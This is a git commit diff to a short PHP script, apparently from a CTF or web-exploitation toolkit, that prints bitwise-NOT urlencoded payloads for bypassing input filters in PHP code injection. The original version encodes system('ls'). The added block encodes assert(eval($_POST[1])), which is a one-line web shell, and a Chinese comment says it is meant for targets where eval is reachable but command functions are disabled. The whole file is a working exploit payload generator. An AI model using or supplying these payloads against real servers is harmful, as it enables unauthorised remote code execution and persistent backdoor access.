c5948fb097a0609af45fc32781ff1bc4c17545e6
Wednis <150148936+Wednis@users.noreply.github.com>
2024-06-09 15:42:59 +0800

    Update 异或urlencode.php

--- php/异或urlencode.php
+++ php/异或urlencode.php
@@ -1,6 +1,17 @@
-<?php 
+#<?php 
 $func='system';
 $arg='("ls")';
 $a=urlencode(~$func);
 $b=urlencode(~$arg);
 echo "(~".$a.")"."(~".$b.");";
+?>
+
+//对于eval(xxx)但是rce函数被禁用的情况
+<?php 
+$func='assert';
+$arg='(eval($_POST[1]))';
+$a=urlencode(~$func);
+$b=urlencode(~$arg);
+echo "(~".$a.")"."(~".$b.");";
+?>
+
